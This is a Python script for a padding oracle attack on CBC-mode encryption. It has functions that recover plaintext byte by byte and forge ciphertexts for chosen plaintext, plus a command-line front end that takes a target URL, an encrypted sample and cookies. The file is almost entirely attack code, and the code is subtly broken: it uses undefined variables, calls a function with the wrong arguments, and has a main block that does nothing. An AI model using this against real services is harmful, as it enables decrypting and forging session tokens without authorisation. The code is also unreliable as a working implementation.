#!/usr/bin/env python
from base64 import b64decode, b64encode
from binascii import hexlify, unhexlify
from cookie import Cookie
from urllib.parse import quote, unquote
import argparse
import requests

def decrypt_last_block(mycookie, ciphertext, block_size, print_result = True):
    ciphertext_to_decrypt = ciphertext[-block_size:]
    pre_ciphertext = ciphertext[-block_size * 2: -block_size]
    head_ciphertext = ciphertext[:-block_size * 2]

    known_bytes = b''
    while len(known_bytes) < block_size:
        n = len(known_bytes)
        for i in range(256):
            if i != n + 1:
                b1 = bytes([0] * (block_size - 1 - n) + [i]) + known_bytes
                b2 = bytes([0] * (block_size - 1 - n) + [n + 1] * (n + 1))
                
                ciphertext = head_ciphertext + \
                             bytes([pre_ciphertext[i] ^ b1[i] ^ b2[i] for i in range(block_size)]) + \
                             ciphertext_to_decrypt
                try:
                    mycookie.get_plaintext(b64encode(ciphertext).decode())
                    known_bytes = bytes([i]) + known_bytes

                    if print_result:
                        print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - n))
                    
                    break
                except:
                    continue
        else:
            known_bytes = bytes([n+1]) + known_bytes

            if print_result:
                print("[+] Success: ({}/256) [Byte {}]".format(i + 1, block_size - n))
    
    return known_bytes

def decrypt_attack(mycookie, ciphertext, block_size, encoding = 0, print_result = False):
    '''
      encoding:
              0 - base64
              1 - url token + base64
              2 - hex

    '''
    if encoding == 0:
        ciphertext = b64decode(ciphertext)
    elif encoding == 1:
        ciphertext = b64decode(unquote(ciphertext))
    elif encoding == 2:
        ciphertext = unhexlify(ciphertext)

    
    plaintext = b""

    ciphertext_block_number = len(ciphertext) // block_size

    for i in range(1, ciphertext_block_number):
        if print_result:
            print("\n*** Starting Block {} of {} ***\n".format(i, ciphertext_block_number - 1))
        
        current_ciphertext = ciphertext_blocks[:(i + 1) * block_size]
        ciphertext_to_decrypt = current_ciphertext[-block_size:]
        current_plaintext = decrypt_last_block(mycookie, current_ciphertext, print_result)
        intermediate_bytes = hexlify(bytes([ciphertext_to_decryp[i] ^ current_plaintext[i] for i in range(block_size)]))
        
        if i == ciphertext_block_number - 1:
            #unpadding
            j = current_plaintext[-1]
            if bytes([j] * j) == current_plaintext[-j:]:
                current_plaintext = current_plaintext[:-j]

        if print_result:
            print("\nBlock {} Results:".format(i))
            print("[+] Cipher Text (HEX): {}".format(hexlify(ciphertext_to_decryp).decode()))
            print("[+] Intermediate Bytes (HEX): {}".format(intermediate_bytes.decode()))
            print("[+] Plain Text: {}".format(current_plaintext.decode()))
        
        plaintext += current_plaintext

    if print_result:
        print("-------------------------------------------------------")
        print("** Finished ***\n")
        print("[+] Decrypted value (ASCII): {}\n".format(plaintext.decode()))
        print("[+] Decrypted value (HEX): {}\n".format(hexlify(plaintext).decode()))
        print("[+] Decrypted value (Base64): {}\n".format(b64encode(plaintext).decode()))
        print("-------------------------------------------------------\n")
    return plaintext

def encrypt_attact(mycookie, ciphertext_sample, block_size, plaintext, encoding = 0, print_result = False):
    ciphertext_sample = b64decode(ciphertext_sample)

    #padding plaintext
    padding = block_size - (len(plaintext) % block_size)
    plaintext = plaintext.encode() + bytes([padding] * padding)

    if len(ciphertext_sample) >= len(plaintext) + block_size:
        ciphertext_sample = ciphertext_sample[:len(plaintext) + block_size]
    else:
        k = len(plaintext) + block_size - len(ciphertext_sample)
        #padding with '0'
        ciphertext_sample += bytes([0] * k)

    last_sample_plaintext = decrypt_last_block(mycookie, ciphertext_sample, block_size)
    plaintext_blocks = [plaintext[i : i + block_size] for i in range(0, len(plaintext), block_size)]
    ciphertext = ciphertext_sample[-block_size:]

    for i in range(len(plaintext_blocks) - 1, -1, -1):
        current_plaintext = plaintext_blocks[i]
        pre_ciphertext = ciphertext_sample[-block_size * 2:-block_size]
        intermediate_bytes = bytes([pre_ciphertext[j] ^ last_sample_plaintext[j] for j in range(block_size)])
        current_ciphertext = bytes([intermediate_bytes[j] ^ current_plaintext[j] for j in range(block_size)])  
        
        if print_result:
            print("\nBlock {} Results:".format(i + 1))
            print("[+] New Cipher Text (HEX): {}".format(hexlify(current_ciphertext).decode()))
            print("[+] Intermediate Bytes (HEX): {}\n".format(hexlify(intermediate_bytes).decode()))

        ciphertext_sample = ciphertext_sample[:-block_size] + current_ciphertext
        last_sample_plaintext = decrypt_last_block(mycookie, ciphertext_sample, block_size)

        ciphertext = current_ciphertext + ciphertext

    ciphertext = quote(b64encode(ciphertext).decode())

    if print_result:
        print("-------------------------------------------------------")
        print("** Finished ***\n")
        print("[+] Encrypted value is: {}".format(ciphertext))
        print("-------------------------------------------------------")

    return ciphertext

def parse_options():
    parser = argparse.ArgumentParser(usage='%(prog)s <URL> <EncryptedSample> <BlockSize> [options]',
                                     description='Padding oracle attack-Tool @Qin',
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('URL', type=str, help='The target URL')
    parser.add_argument('EncryptedSample', type=str, help='The encrypted value you want to test. Must also be present in the URL, PostData or a Cookie')
    parser.add_argument('BlockSize', type=int, help='The block size being used by the algorithm')


    parser.add_argument('--cookies', type=str, help='Cookies (name1=value1; name2=value2)')
    parser.add_argument('--encoding', type=int, help='Encoding Format of Sample (Default 0)[0-2]: 0=Base64, 1=Base64+UrlToken, 2=Hex')
    parser.add_argument('--headers', type=str, help='Custom Headers (name1::value1;name2::value2)')
    parser.add_argument('--plaintext', type=str, help='Plain-Text to Encrypt')
    
    args = parser.parse_args()

    return args


if __name__ == "__main__":
    args = parse_options()

    url = args.URL
    encrypted_sample = args.EncryptedSample
    block_size = args.BlockSize

    # message = "The MAC bug allows an attacker to submit"
    # mycookie = Cookie()
    # ciphertext = mycookie.get_ciphertext(message)
    # #decrypt_attack(mycookie, ciphertext, 16)
    
    # plain = "IV's which are processed by the server in CBC mode"
    # cipher = encrypt_attact(mycookie, ciphertext, 16, plain, print_result = True)


    